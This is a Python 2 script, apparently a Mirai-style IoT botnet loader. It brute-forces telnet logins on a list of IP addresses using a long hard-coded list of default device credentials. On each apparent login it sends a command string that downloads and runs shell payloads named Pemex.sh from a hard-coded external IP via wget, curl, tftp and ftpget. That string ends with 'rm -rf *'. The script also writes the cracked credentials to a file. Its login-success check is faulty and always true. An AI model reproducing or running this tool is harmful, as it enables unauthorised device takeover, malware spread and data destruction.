#!/usr/bin/python
import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout
 
if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
    sys.exit()
 
combo = [
        "root:root",
        "root:",
        "admin:admin",
        "support:support",
        "user:user",
        "admin:",
        "admin:password",
        "root:vizxv",
        "root:admin",
        "root:xc3511",
        "root:888888",
        "root:xmhdipc",
        "root:default",
        "root:juantech",
        "root:123456",
        "root:54321",
        "root:12345",
        "root:pass",
        "ubnt:ubnt",
        "root:klv1234",
        "root:Zte521",
        "root:hi3518",
        "root:jvbzd",
        "root:anko",
        "root:zlxx.",
        "root:7ujMko0vizxv",
        "root:7ujMko0admin",
        "root:system",
        "root:ikwb",
        "root:dreambox",
        "root:user",
        "root:realtek",
        "root:00000000",
        "admin:1111111",
        "admin:1234",
        "admin:12345",
        "admin:54321",
        "admin:123456",
        "admin:7ujMko0admin",
        "admin:1234",
        "admin:pass",
        "admin:meinsm",
        "admin:admin1234",
        "root:1111",
        "admin:smcadmin",
        "admin:1111",
        "root:666666",
        "root:password",
        "root:1234",
        "root:klv123",
        "Administrator:admin",
        "service:service",
        "supervisor:supervisor",
        "guest:guest",
        "guest:12345",
        "guest:12345",
        "admin1:password",
        "administrator:1234",
        "666666:666666",
        "888888:888888",
        "tech:tech",
        "u:p",
        "adm:",
        "admin:admin",
        "admin:1234567890",
        "admin:pass",
        "admin:service",
        "admin:support",
        "admin:",
        "admin:1234",
        "admin:1111",
        "admin:7ujMko0admin",
        "admin:password",
        "admin:tech",
        "admin:admin123",
        "admin:smcadmin",
        "admin:11111111",
        "admin:admin1234",
        "admin:switch",
        "admin:123456",
        "admin:default",
        "admin:fliradmin",
        "admin:wbox",
        "admin:jvc",
        "admin:meinsma",
        "admin:atlantis",
        "admin:epicrouter",
        "admin:cisco",
        "admin:P@55w0rd!",
        "admin:michaelangelo",
        "admin:my_DEMARC",
        "admin:adslroot",
        "admin:administrator",
        "admin:AitbISP4eCiG",
        "admin:7ujMko0vizxv",
        "admin:ubnt",
        "admin:admin117.35.97.74",
        "admin:oelinux123",
        "Administrator:",
        "alpine:alpine",
        "daemon:",
        "default:",
        "default:default",
        "default:antslq",
        "default:password",
        "guest:12345",
        "guest:123456",
        "guest:guest",
        "guest:",
        "guest:1111",
        "guest:xc3511",
        "mg3500:merlin",
        "mother:fucker",
        "operator:operator",
        "oracle:oracle",
        "PlcmSpIp:PlcmSpIp",
        "root:jauntech",
        "root:root",
        "root:xc3511",
        "root:vizxv",
        "root:Zte521",
        "root:1234qwer",
        "root:default",
        "root:anko",
        "root:admin",
        "root:juantech",
        "root:",
        "root:123456",
        "root:oelinux123",
        "root:1234567890",
        "root:888888",
        "root:7ujMko0admin",
        "root:xmhdipc",
        "root:admin1234",
        "root:7ujMko0vizxv",
        "root:pass",
        "root:zte9x15",
        "root:dreambox",
        "root:12345",
        "root:1111",
        "root:000000",
        "root:1234",
        "root:antslq",
        "root:ikwd",
        "root:zlxx.",
        "root:avtech",
        "root:comcom",
        "root:hi3518",
        "root:klv123",
        "root:realtek",
        "root:jvbzd",
        "root:ahetzip8",
        "root:b120root",
        "root:user",
        "root:PASSWORD",
        "root:pa55w0rd",
        "root:LSiuY7pOmZG2s",
        "root:changeme",
        "root:maxided",
        "root:calvin",
        "root:davox",
        "root:blender",
        "root:password",
        "root:Serv4EMC",
        "root:attack",
        "root:tini",
        "root:fivranne",
        "root:ROOT500",
        "root:tslinux",
        "root:ascend",
        "root:cms500",
        "root:ggdaseuaimhrke",
        "root:iDirect",
        "root:orion99",
        "root:3ep5w2u",
        "root:666666",
        "root:GMB182",
        "root:abc123",
        "root:123qwe",
        "root:coolphoenix579",
        "root:1q2w3e4r5",
        "root:alpine",
        "root:bananapi",
        "root:openvpnas",
        "root:openssh",
        "root:54321",
        "root:ikwb",
        "root:klv1234",
        "supervisor:supervisor",
        "supervisor:zyad1234",
        "support:1234",
        "support:support",
        "support:123456",
        "support:zlxx.",
        "support:admin",
        "support:12345",
        "support:login",
        "support:123",
        "tech:tech",
        "telnet:telnet",
        "ubnt:ubnt",
        "user:user",
        "user:",
        "user:123456",
        "root:xc3511",
        "root:vizxv",
        "root:admin",
        "admin:admin",
        "root:888888",
        "root:xmhdipc",
        "root:default",
        "root:juantech",
        "root:123456",
        "root:54321",
        "support:support",
        "root:",
        "admin:password",
        "root:root",
        "root:12345",
        "user:user",
        "admin:",
        "root:pass",
        "admin:admin1234",
        "root:1111",
        "admin:smcadmin",
        "admin:1111",
        "root:666666",
        "root:password",
        "root:1234",
        "root:klv123",
        "Administrator:admin",
        "service:service",
        "supervisor:supervisor",
        "guest:guest",
        "guest:12345",
        "admin1:password",
        "administrator:1234",
        "666666:666666",
        "888888:888888",
        "ubnt:ubnt",
        "root:klv1234",
        "root:Zte521",
        "root:hi3518",
        "root:jvbzd",
        "root:anko",
        "root:zlxx.",
        "root:7ujMko0vizxv",
        "root:7ujMko0admin",
        "root:system",
        "root:ikwb",
        "root:dreambox",
        "root:user",
        "root:realtek",
        "root:00000000",
        "admin:1111111",
        "admin:1234",
        "admin:12345",
        "admin:54321",
        "admin:123456",
        "admin:7ujMko0admin",
        "admin:pass",
        "admin:meinsm",
        "tech:tech",
        "mother:fucker",
        "default:",
        "admin:ADMIN",
        "root:1234567",
        "supervisor:zyad1234",
        "daemon:",
        "adm:",
        "default:default",
        "root:696969",
        "Alphanetworks:wrgg19_c_dlwbr_dir300",
        "Alphanetworks:wrgn49_dlob_dir600b",
        "Alphanetworks:wrgn23_dlwbr_dir600b",
        "Alphanetworks:wrgn22_dlwbr_dir615",
        "Alphanetworks:wrgnd08_dlob_dir815",
        "Alphanetworks:wrgg15_di524",
        "Alphanetworks:wrgn39_dlob.hans_dir645",
        "Alphanetworks:wapnd03cm_dkbs_dap2555",
        "Alphanetworks:wapnd04cm_dkbs_dap3525",
        "Alphanetworks:wapnd15_dlob_dap1522b",
        "Alphanetworks:wrgac01_dlob.hans_dir865",
        "Alphanetworks:wrgn23_dlwbr_dir300b",
        "Alphanetworks:wrgn28_dlob_dir412",
        "root:898996",
        "root:123456789",
        "root:1234505",
        "root:1231234",
        "telnet:telnet",
        "pi:bodhilinux",
        "root:GM8182",
        "admin:cisco",
        "admin:22222",
        "root:pa55w0rd",
        "root:raspberrypi",
        "root:toor",
        "PlcmSpIp:PlcmSpIp",
        "root:oelinux123",
        "Alphanetworks:wrgn39_dlob.hans_dir645_V1",
        "mother:fucker"
]
 
ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0
 
for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"
 
 
class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
        self.rekdevice="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.73.134.108/Pemex.sh; curl -O http://94.73.134.108/Pemex.sh; chmod 777 Pemex.sh; sh Pemex.sh; tftp 94.73.134.108 -c get Pemex.sh; chmod 777 Pemex.sh; sh Pemex.sh; tftp -r Pemex2.sh -g 94.73.134.108; chmod 777 Pemex2.sh; sh Pemex2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.73.134.108 Pemex1.sh Pemex1.sh; sh Pemex1.sh; rm -rf Pemex.sh Pemex.sh Pemex2.sh Pemex1.sh; rm -rf *" #command to send
    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(0.37)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(username + "\r\n")
                    time.sleep(0.1)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(password + "\r\n")
                    time.sleep(0.1)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if "#" in prompt or "$":
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        tn.send(self.rekdevice + "\r\n")
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n") # 1.1.1.1:23 user:pass # mirai
                        fh.flush()
                        print "[+] GOTCHA -> %s:%s:%s"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()
 
def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')
 
def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass
 
global fh
fh = open("workingtelnet.txt","a")
for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass